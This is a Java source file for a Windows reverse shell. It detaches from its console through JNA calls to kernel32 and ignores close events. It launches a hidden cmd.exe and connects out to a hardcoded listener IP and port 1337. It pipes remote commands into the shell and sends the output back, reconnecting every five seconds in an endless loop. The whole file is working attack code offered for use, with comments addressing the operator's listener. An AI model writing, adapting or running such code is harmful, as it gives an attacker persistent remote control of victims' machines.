import com.sun.jna.*;
import com.sun.jna.win32.*;
import java.io.*;
import java.net.*;
import java.util.Arrays;
import java.util.List;

public class ReverseShell {
    // JNA mapping to detach and ignore console events
    public interface Kernel32 extends StdCallLibrary {
        Kernel32 INSTANCE = Native.load("kernel32", Kernel32.class, W32APIOptions.DEFAULT_OPTIONS);
        boolean FreeConsole();
        boolean SetConsoleCtrlHandler(HandlerRoutine handler, boolean add);
        interface HandlerRoutine extends StdCallCallback {
            boolean callback(int dwCtrlType);
        }
    }

    public static void main(String[] args) {
        // Detach from any console & ignore close events
        Kernel32.INSTANCE.FreeConsole();
        Kernel32.INSTANCE.SetConsoleCtrlHandler(null, true);

        String host = "172.29.252.148";  // your listener IP
        int port   = 1337;               // your listener port

        // 1) Launch ONE hidden cmd.exe
        Process cmd;
        try {
            cmd = new ProcessBuilder("cmd.exe")
                    .redirectErrorStream(true)
                    .start();
        } catch (IOException e) {
            return; // Can't start shell
        }

        BufferedWriter cmdIn  = new BufferedWriter(new OutputStreamWriter(cmd.getOutputStream()));
        BufferedReader  cmdOut = new BufferedReader(new InputStreamReader(cmd.getInputStream()));

        // 2) Forever: connect, pipe streams, reconnect if dropped
        while (true) {
            try (Socket socket = new Socket(host, port);
                 BufferedReader attackerIn  = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                 BufferedWriter attackerOut = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream())))
            {
                // Forward cmd.exe stdout → attacker
                Thread tOut = new Thread(() -> {
                    String line;
                    try {
                        while ((line = cmdOut.readLine()) != null) {
                            attackerOut.write(line);
                            attackerOut.newLine();
                            attackerOut.flush();
                        }
                    } catch (IOException ignored) {}
                });
                tOut.setDaemon(true);
                tOut.start();

                // Forward attacker → cmd.exe stdin
                String cmdLine;
                while ((cmdLine = attackerIn.readLine()) != null) {
                    cmdIn.write(cmdLine);
                    cmdIn.newLine();
                    cmdIn.flush();
                }
            } catch (IOException e) {
                // connection failed or dropped
            }

            // Wait 5s then retry
            try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
        }
    }
}
